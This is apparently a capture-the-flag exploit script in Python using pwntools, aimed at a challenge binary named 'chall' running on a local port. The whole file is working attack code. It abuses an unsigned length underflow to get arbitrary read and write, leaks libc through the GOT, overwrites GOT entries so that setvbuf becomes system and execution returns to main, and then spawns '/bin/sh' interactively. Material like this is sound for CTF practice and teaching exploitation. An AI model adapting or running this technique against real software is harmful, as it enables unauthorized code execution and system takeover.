from pwn import *

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]

elf = ELF("./chall")
libc = ELF("./libc-2.31.so")
setvbuf_got = elf.got["setvbuf"]

# io = gdb.debug('./chall', 'c')
# io = process("./chall")
io = remote("localhost", 6003)
io.sendlineafter(b"Please enter your UTF-8 string: ", b"\xff")
# now str.length() is a big number because of unsigned underflow
# and &str.data[0] == 0
# so we have (almost) arbitrary (32 bits) read/write now

# leak libc from GOT
io.sendlineafter(b"> ", b"3")
io.sendlineafter(b"Enter index: ", str(setvbuf_got // 4).encode())
lo = int(io.recvlineS())
io.sendlineafter(b"> ", b"3")
io.sendlineafter(b"Enter index: ", str((setvbuf_got + 4) // 4).encode())
hi = int(io.recvlineS())
libc_addr = ((hi << 32) + lo) - libc.sym["setvbuf"]
print(f"{libc_addr = :#x}")
libc.address = libc_addr

# set up system("/bin/sh") when returning to main
binsh = next(libc.search(b"/bin/sh\0"))
io.sendlineafter(b"> ", b"2")
io.sendlineafter(b"Enter index: ", str(elf.sym["stdin"] // 4).encode())
io.sendlineafter(b"Enter codepoint: ", str(binsh & 0xFFFFFFFF).encode())

io.sendlineafter(b"> ", b"2")
io.sendlineafter(b"Enter index: ", str(elf.got["setvbuf"] // 4).encode())
io.sendlineafter(b"Enter codepoint: ", str(libc.sym["system"] & 0xFFFFFFFF).encode())

# we need to write some GOT entry to main, but it takes 2 writes
# std::ostream::operator<<(std::ostream &os, uint32_t val) are chosen because it is not called during writes
fn = elf.got["_ZNSolsEj"]
io.sendlineafter(b"> ", b"2")
io.sendlineafter(b"Enter index: ", str(fn // 4).encode())
io.sendlineafter(b"Enter codepoint: ", str(elf.sym["main"] & 0xFFFFFFFF).encode())
io.sendlineafter(b"> ", b"2")
io.sendlineafter(b"Enter index: ", str((fn + 4) // 4).encode())
io.sendlineafter(b"Enter codepoint: ", str(elf.sym["main"] >> 32).encode())

# done, let's call _ZNSolsEj to return to main
io.sendlineafter(b"> ", b"3")
io.sendlineafter(
    b"Enter index: ", str(elf.sym["main"] // 4).encode()
)  # any valid address works

io.interactive()
